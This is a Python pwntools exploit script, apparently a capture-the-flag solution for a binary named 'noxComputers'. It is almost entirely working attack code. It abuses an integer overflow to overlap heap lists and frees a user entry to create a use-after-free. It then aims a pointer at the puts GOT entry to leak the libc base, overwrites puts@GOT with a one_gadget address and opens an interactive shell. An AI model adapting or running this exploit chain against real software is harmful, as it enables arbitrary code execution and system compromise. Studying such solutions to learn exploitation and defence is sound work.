from pwn import *
#context.log_level = 'debug'

p = process('./noxComputers')
elf = ELF('./noxComputers')
'''
What would you like to do?
1. Buy a premium user membership
2. Buy multiple premium memberships AND BE ELIGIBLE FOR UP TO 70% DISCOUNT!
3. Buy a computer
4. Show account details
5. Edit account details
6. Return a computer
7. Exit
'''

def buy_a_premium_user(username,money):
	p.sendlineafter('choice: ','1')
	p.sendlineafter('username: ',username)
	p.sendlineafter('account: ',str(money))



def buy_multiple_premium_users(username,money,stop = 'n'):
	#p.sendlineafter('choice: ','2')
	#p.sendlineafter('buy: ',str(amount_of_premiums))
	p.sendafter('press Y: ',stop)
	p.sendlineafter(': ',username)
	p.sendlineafter('user: ',str(money))


def buy_a_computer(idx,computer_name,manufacturer_name,super_fast,pay_money,if_buy):
	p.sendlineafter('choice: ','3')
	p.sendlineafter('id: ',str(idx))
	p.sendlineafter('name: ',computer_name)
	p.sendlineafter('name: ',manufacturer_name)
	p.sendlineafter('computer?(Y/N): ',super_fast)
	p.sendlineafter('pay: ',str(pay_money))
	p.sendlineafter('(Y/N): ',if_buy)


def show_account_details(idx):
	p.sendlineafter('choice: ','4')
	p.sendlineafter('id: ',str(idx))



def edit_account_details(idx,username,money):
	p.sendlineafter('choice: ','5')
	p.sendlineafter('id: ',str(idx))
	p.sendlineafter('username: ',username)
	p.sendlineafter('account: ',str(money))


def return_a_computer(idx,computer_name):
	p.sendlineafter('choice: ','6')
	p.sendlineafter('id: ',str(idx))
	p.sendlineafter('name: ',computer_name)

#user_list = 0x6040E0
#computer_list = 0x6064E0

#add a computer
buy_a_premium_user('a',9)
buy_a_computer(0,'a_computer','a_manufacturer','Y',1,'Y')


#use Integer Overflow to overlap computer_list
p.sendlineafter('choice: ','2')
p.sendlineafter('buy: ','65535')

for i in range(1151):
	buy_multiple_premium_users(str(i),16)

buy_multiple_premium_users('fake',8)
p.sendafter('press Y: ','Y')


#free user[1152]
edit_account_details(1152,'pwn',0) #set buy_flag = 0
return_a_computer(1,'fake')



'''
add user
new user_struct --> old user_name
new user_name --> old user_struct
make the new user_name --> puts_got
And therefore, the old 'name' will point to the puts_got
''' 
p.sendlineafter('choice: ','2')
p.sendlineafter('buy: ','64385') # 65536 - 1151 = 64385
puts_got = elf.got['puts']
buy_multiple_premium_users(p64(puts_got),9)
p.sendafter('press Y: ','Y')



#leak libc
show_account_details(1152)
p.recvuntil('Username: ')
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
log.success('puts addr : 0x%x' %puts_addr)
offset_puts = 0x000000000006f690
libc_base = puts_addr - offset_puts
log.success('libc base addr : 0x%x'%libc_base)
one_gadget = libc_base + 0x45216


#hijack puts_got --> one_gadget
edit_account_details(1152,p64(one_gadget),1)

p.interactive()

